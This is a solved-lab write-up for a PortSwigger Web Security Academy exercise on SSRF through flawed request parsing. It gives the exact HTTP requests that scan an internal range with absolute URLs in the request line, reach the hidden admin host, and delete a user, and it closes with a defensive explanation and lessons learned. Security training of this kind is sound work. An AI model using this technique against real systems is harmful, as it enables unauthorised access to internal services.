# PortSwigger Lab: SSRF via flawed request parsing

- **Lab Name:** SSRF via flawed request parsing
- **Topic:** HTTP Host Header Attacks
- **Vulnerability Type:** Server-Side Request Forgery (SSRF) via inconsistent request parsing
- **Difficulty:** Practitioner
- **Status:** Solved (banner-verified 27 Nov 2026)
- **Instance:** https://0ade008703276bbf818d8404000000cb.web-security-academy.net/

## Solution

Same idea as Lab 4 (routing-based SSRF) — the front-end routes by host —
but here a plain `Host` header scan does **not** work. The trick is the
**request line itself**: sending the target as an absolute URL in the
request line (`GET http://192.168.0.<n>/admin HTTP/1.1`) makes the
front-end's parser take the host from the URL and route the request to that
internal host, while the `Host` header still carries the public lab host.
Scanning the internal range this way finds the admin host, and from there
carlos is deleted as usual.

### Step 1 — Scan the internal range with an absolute URL

For each address `192.168.0.0` … `192.168.0.255`, send the request with the
address in the request line, not in the Host header:

```
GET http://192.168.0.<n>/admin HTTP/1.1
Host: 0ade008703276bbf818d8404000000cb.web-security-academy.net
Cookie: session=<session>; _lab=<lab cookie>
```

Most addresses return 404 / no route. One address — **192.168.0.68** —
returns **HTTP 302 to `/admin`**. That is the internal admin host: the
front-end parsed the absolute URL, routed to it, and the admin host
redirected to its admin page.

### Step 2 — Open the admin panel

```
GET http://192.168.0.68/admin HTTP/1.1
Host: 0ade008703276bbf818d8404000000cb.web-security-academy.net
Cookie: session=<session>; _lab=<lab cookie>
```

Response is HTTP 200 and contains the admin "Delete user" form
(`action='/admin/delete'` with a hidden CSRF token). As in Labs 4 and 6,
this page contains **no literal "Admin panel" text** — the delete form
itself is the marker that the internal admin host was reached.

### Step 3 — Delete carlos

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.68
Cookie: session=<session>; _lab=<lab cookie>
Content-Type: application/x-www-form-urlencoded

csrf=<token from the admin form>&username=carlos
```

Response is HTTP 302 (redirect after deleting carlos) and the home page
then shows **"Congratulations, you solved the lab!"**.

All of this is automated in `~/workspace/scripts/ps-host-header.py`
(`lab5`).

## Practical Explanation

This is a parser-differential SSRF: two parts of the same server disagree
about where a request is going. The request line may legally carry an
absolute URL (`GET http://host/path HTTP/1.1`), and the front-end here
trusts the host in that URL for routing, while the `Host` header — the
value every other check looks at — still says the public lab host. So a
request that "looks" public to the Host-header checks is actually routed
to an internal host. The scan is identical to Lab 4's, only the address is
hidden in the request line instead of the Host header. In the real world
this class of bug is why request parsing must be consistent: every layer
(front-end, cache, back-end) must agree on the target host, and routing
must never follow a client-supplied absolute URL to an internal address.

## Lessons Learned

- **When the Host header scan fails, try the request line.** Lab 4 and
  Lab 5 look identical from the outside; the only difference is *where*
  the internal address has to be placed. A plain Host scan on this lab
  finds nothing — the absolute-URL form is the whole exploit.
- **A 302 to `/admin` is the signal.** As in Lab 4, the admin host
  announces itself by redirecting to its admin page.
- **Check for the functional marker, not a guessed label.** The admin page
  has no "Admin panel" heading — the delete form (`/admin/delete`) is what
  proves access.
- **Instances expire fast.** This lab's first instance died (HTTP 504)
  before the scan finished; the solve used a fresh instance launched the
  same morning. If the scan returns nothing on every address, check the
  instance is still alive before assuming the lab is hard.
